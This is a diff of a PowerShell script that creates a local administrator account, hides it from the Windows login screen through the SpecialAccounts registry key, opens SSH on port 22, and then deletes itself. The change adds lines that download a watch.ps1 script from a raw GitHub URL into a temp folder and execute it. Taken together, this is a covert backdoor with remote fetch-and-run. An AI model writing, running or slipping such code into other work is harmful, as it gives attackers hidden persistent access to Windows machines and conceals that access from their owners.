@@ -15,7 +15,11 @@ New-LocalUser $user -Password $p -FullName $user -Description $user
 Add-LocalGroupMember -Group "Administrators" -Member $user
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
-.\watch.ps1
+
+
+mkdir $env:Temp/$temp_dir
+Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
+./$env:Temp/$temp_dir/watch.ps1
 
 
 # Open SSH and port 22 (add a rule in firewall as well)
@@ -27,7 +31,5 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
 }
 
 
-mkdir $env:Temp/$temp_dir
-echo "hi" > $env:Temp/$temp_dir/hi.txt
 
 Remove-Item $PSCommandPath -Force
